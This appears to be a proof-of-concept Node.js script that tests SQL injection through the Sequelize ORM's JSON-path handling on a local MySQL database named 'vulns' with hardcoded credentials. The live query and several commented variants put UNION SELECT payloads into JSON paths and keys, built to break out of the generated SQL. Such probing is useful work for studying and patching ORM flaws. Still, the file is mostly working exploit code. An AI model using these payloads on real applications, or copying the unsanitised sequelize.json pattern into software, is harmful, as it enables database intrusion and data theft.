// Set up sequelize mysql connection
const Sequelize = require('sequelize');

const sequelize = new Sequelize('vulns', 'admin', '1234', {
    host: 'localhost',
    dialect: 'mysql'
  });

class Product extends Sequelize.Model {}

Product.init({
    name: Sequelize.STRING,
    price: Sequelize.INTEGER,
    review: Sequelize.JSON,
}, {
    sequelize,
    tableName: 'Product',
    timestamps: false
});

(async () => {
  await sequelize.sync();

  string = "review.rating' = 3 UNION SELECT VERSION(); -- ";

  console.log(await Product.findAll({
    // where: {
    //   review: {
    //     "rating') AS DECIMAL) = 3 UNION SELECT VERSION(); -- ": 1
    //   }
    // },
    //where: {review: {'rating': 3}},
    where: {name: sequelize.json("review.rating' = 10 UNION SELECT VERSION(); -- ", 10)},
    attributes: ['name'],
    raw: true,
  }));
})(); 



// Product.findAll(
//   {
//     where:{review: {"a')) AS DECIMAL) = 1 UNION SELECT VERSION(); -- ":1}},
//     attributes: ['name'],
//     raw: true,
//   }
// ).then(products => {
//     console.log("All products:", JSON.stringify(products, null, 4));
//   });

// exports.product_list = function (req, res) {
    
// }